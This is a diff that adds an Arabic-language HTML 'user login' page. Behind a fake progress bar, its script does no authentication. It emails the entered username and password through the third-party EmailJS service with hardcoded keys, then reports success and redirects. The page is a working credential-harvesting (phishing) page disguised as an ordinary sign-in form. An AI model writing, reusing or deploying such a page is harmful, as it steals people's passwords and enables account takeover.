@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link rel="website icon" type="image/png" href="OIG2.jpg">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0a0a0a;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .login-container, .progress-container {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+        }
+        input {
+            display: block;
+            margin: 10px auto;
+            padding: 10px;
+            width: 80%;
+        }
+        button {
+            background: #007BFF;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+        .progress-bar {
+            width: 100%;
+            background: #333;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .progress {
+            height: 20px;
+            width: 0%;
+            background: #00ff00;
+        }
+        #status {
+            margin-top: 10px;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container" id="loginForm">
+        <h2>USER LOGIN</h2>
+        <input type="text" id="username" placeholder="اسم المستخدم" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <button onclick="login()">تسجيل الدخول</button>
+        <p id="status"></p>
+    </div>
+
+    <div class="progress-container" id="progressBar" style="display: none;">
+        <h2>USER LOGIN</h2>
+        <div class="progress-bar">
+            <div class="progress" id="progress"></div>
+        </div>
+        <span id="progressText">0%</span>
+    </div>
+
+    <script>
+        // تهيئة EmailJS باستخدام مفتاحك العام
+        (function() {
+            emailjs.init("69bWrdBeQX-Xfej-Q"); // استبدل بـ Public Key الخاص بك
+        })();
+
+        function login() {
+            let username = document.getElementById('username').value.trim();
+            let password = document.getElementById('password').value.trim();
+            let status = document.getElementById('status');
+
+            if (!username || !password) {
+                status.innerText = "❌ يرجى إدخال اسم المستخدم وكلمة المرور!";
+                return;
+            }
+
+            // إخفاء نموذج تسجيل الدخول وإظهار شريط التقدم
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('progressBar').style.display = 'block';
+
+            let progress = 0;
+            let interval = setInterval(() => {
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    sendEmail(username, password);  // إرسال البريد الإلكتروني بعد انتهاء شريط التقدم
+                } else {
+                    progress += 10;
+                    document.getElementById('progress').style.width = progress + '%';
+                    document.getElementById('progressText').innerText = progress + '%';
+                }
+            }, 300);
+        }
+
+        function sendEmail(username, password) {
+            let templateParams = {
+                user_name: username,       // متغير اسم المستخدم
+                user_password: password,   // متغير كلمة المرور
+            };
+
+            // إرسال البريد الإلكتروني باستخدام EmailJS
+            emailjs.send("service_fd7uf4j", "template_yv8cvrp", templateParams)
+                .then(function(response) {
+                    console.log("✅ تم تسجيل الدخول", response.status, response.text);
+                    alert("✅ تم  تسجيل الدخول بنجاح!");
+                    window.location.href = 'index.html'; // إعادة التوجيه بعد النجاح
+                }, function(error) {
+                    console.error("❌ فشل في إرسال  الرجاء المحاولة لاحقاً.", error);
+                    alert("❌ فشل في إرسال  الرجاء المحاولة لاحقاً.");
+                    document.getElementById('loginForm').style.display = 'block';
+                    document.getElementById('progressBar').style.display = 'none';
+                });
+        }
+    </script>
+
+</body>
+</html>
